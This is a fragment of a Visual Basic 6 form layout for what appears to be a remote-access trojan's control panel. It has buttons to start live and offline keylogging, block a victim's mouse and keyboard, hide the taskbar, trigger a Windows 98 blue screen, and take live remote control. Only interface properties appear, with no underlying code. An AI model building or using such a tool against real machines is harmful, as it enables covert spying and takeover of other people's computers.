         Top             =   960
         Width           =   3195
      End
      Begin VB.TextBox Text22 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3840
         TabIndex        =   244
         Top             =   1320
         Width           =   3195
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   80
         Left            =   1080
         TabIndex        =   224
         Top             =   120
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   84
         Left            =   1920
         TabIndex        =   225
         Top             =   120
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   85
         Left            =   1080
         TabIndex        =   226
         Top             =   480
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   86
         Left            =   1920
         TabIndex        =   227
         Top             =   480
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   87
         Left            =   1080
         TabIndex        =   228
         Top             =   840
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   88
         Left            =   1920
         TabIndex        =   229
         Top             =   840
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   89
         Left            =   1080
         TabIndex        =   230
         Top             =   1200
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   90
         Left            =   1920
         TabIndex        =   231
         Top             =   1200
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   91
         Left            =   1080
         TabIndex        =   232
         Top             =   1560
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   92
         Left            =   1920
         TabIndex        =   233
         Top             =   1560
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   93
         Left            =   1080
         TabIndex        =   234
         Top             =   1920
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   94
         Left            =   1920
         TabIndex        =   235
         Top             =   1920
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   95
         Left            =   4200
         TabIndex        =   236
         Top             =   120
         Width           =   1275
         _ExtentX        =   2249
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "open"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   96
         Left            =   5520
         TabIndex        =   237
         Top             =   120
         Width           =   1275
         _ExtentX        =   2249
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "close"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   97
         Left            =   4200
         TabIndex        =   238
         Top             =   480
         Width           =   1275
         _ExtentX        =   2249
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "on"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   98
         Left            =   5520
         TabIndex        =   239
         Top             =   480
         Width           =   1275
         _ExtentX        =   2249
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "off"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   99
         Left            =   3120
         TabIndex        =   240
         Top             =   1920
         Width           =   1875
         _ExtentX        =   3307
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "beep"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   100
         Left            =   5040
         TabIndex        =   241
         Top             =   1920
         Width           =   1995
         _ExtentX        =   3519
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "! BlueScreen (win98) !"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   101
         Left            =   3120
         TabIndex        =   242
         Top             =   960
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "browse :"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   102
         Left            =   3120
         TabIndex        =   243
         Top             =   1320
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "print :"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Line Line5 
         BorderColor     =   &H00404040&
         X1              =   3000
         X2              =   7080
         Y1              =   1800
         Y2              =   1800
      End
      Begin VB.Line Line4 
         BorderColor     =   &H00404040&
         X1              =   3000
         X2              =   7080
         Y1              =   840
         Y2              =   840
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00404040&
         X1              =   2895
         X2              =   2895
         Y1              =   120
         Y2              =   2280
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "show sounds :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   25
         Left            =   3120
         TabIndex        =   223
         Top             =   480
         Width           =   1095
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "cd-rom :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   24
         Left            =   3120
         TabIndex        =   222
         Top             =   120
         Width           =   735
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "desktop :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   23
         Left            =   120
         TabIndex        =   221
         Top             =   480
         Width           =   855
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "clock :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   22
         Left            =   120
         TabIndex        =   220
         Top             =   1920
         Width           =   615
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "tb programs :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   21
         Left            =   120
         TabIndex        =   219
         Top             =   1560
         Width           =   1095
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "start button :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   20
         Left            =   120
         TabIndex        =   218
         Top             =   840
         Width           =   1095
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "tray icons :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   19
         Left            =   120
         TabIndex        =   217
         Top             =   1200
         Width           =   855
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "taskbar :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   16
         Left            =   120
         TabIndex        =   216
         Top             =   120
         Width           =   735
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   5
      Left            =   120
      TabIndex        =   120
      Top             =   3360
      Visible         =   0   'False
      Width           =   7185
      Begin VB.CheckBox Check4 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "send keys live ( as typed )"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   130
         Top             =   1080
         Width           =   3255
      End
      Begin VB.TextBox Text12 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   240
         TabIndex        =   121
         Top             =   1440
         Width           =   3255
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   41
         Left            =   3720
         TabIndex        =   122
         Top             =   120
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "start live keylogging"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   42
         Left            =   240
         TabIndex        =   123
         Top             =   480
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "unblock mouse and keyboard"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   43
         Left            =   240
         TabIndex        =   124
         Top             =   120
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "block mouse and keyboard input"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   44
         Left            =   240
         TabIndex        =   125
         Top             =   1800
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "send keys above to current app"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   45
         Left            =   3720
         TabIndex        =   126
         Top             =   480
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "stop live keylogging"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   46
         Left            =   3720
         TabIndex        =   127
         Top             =   1080
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         Enabled         =   0   'False
         BackColor       =   0
         Caption         =   "start offline keylogger"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   8421504
         ShadowColor     =   8421504
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   47
         Left            =   3720
         TabIndex        =   128
         Top             =   1440
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         Enabled         =   0   'False
         BackColor       =   0
         Caption         =   "stop offline keylogger"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   8421504
         ShadowColor     =   8421504
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   48
         Left            =   3720
         TabIndex        =   129
         Top             =   2040
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         Enabled         =   0   'False
         BackColor       =   0
         Caption         =   "get offline logged keys"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   8421504
         ShadowColor     =   8421504
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "see help on sendkeys statement (same format)"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   26
         Left            =   240
         TabIndex        =   246
         Top             =   2160
         Width           =   3375
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   7
      Left            =   720
      TabIndex        =   143
      Top             =   3120
      Visible         =   0   'False
      Width           =   7185
      Begin VB.OptionButton Option3 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "256 colors"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   4320
         TabIndex        =   153
         Top             =   1080
         Width           =   1095
      End
      Begin VB.OptionButton Option2 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "16 colors"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3120
         TabIndex        =   152
         Top             =   1080
         Value           =   -1  'True
         Width           =   975
      End
      Begin VB.OptionButton Option1 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "2 colors"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   151
         Top             =   1080
         Width           =   855
      End
      Begin VB.CheckBox Check5 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "mouse and keyboard control"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2400
         TabIndex        =   150
         Top             =   1440
         Width           =   2415
      End
      Begin VB.TextBox Text16 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3480
         TabIndex        =   145
         Text            =   "0"
         Top             =   600
         Width           =   975
      End
      Begin VB.TextBox Text15 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3480
         TabIndex        =   144
         Text            =   "5"
         Top             =   240
         Width           =   975
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   59
         Left            =   240
         TabIndex        =   146
         Top             =   1920
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "start live control"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   60
         Left            =   3720
         TabIndex        =   147
         Top             =   1920
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "stop live control (CTRL-ALT-F10)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "change these values only if live control doesn't remotely work or you understand what they are here for"
         ForeColor       =   &H00FFFFFF&
         Height          =   855
         Index           =   27
         Left            =   4560
         TabIndex        =   247
         Top             =   120
         Width           =   2055
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Slices (horizontal x vertical) :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   18
         Left            =   1440
         TabIndex        =   149
         Top             =   240
         Width           =   2055
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Time (seconds) to wait between screens :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   17
         Left            =   480
         TabIndex        =   148
         Top             =   600
         Width           =   3015
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   6
      Left            =   480
      TabIndex        =   131
      Top             =   4080
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text14 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   5880
         TabIndex        =   138
         Top             =   1080
         Width           =   975
      End
      Begin VB.TextBox Text13 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   4320
         TabIndex        =   132
         Top             =   1080
         Width           =   975
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   49
         Left            =   240
         TabIndex        =   133
         Top             =   1080
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide mouse cursor"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   50
         Left            =   240
         TabIndex        =   134
         Top             =   480
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "unblock mouse and keyboard"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
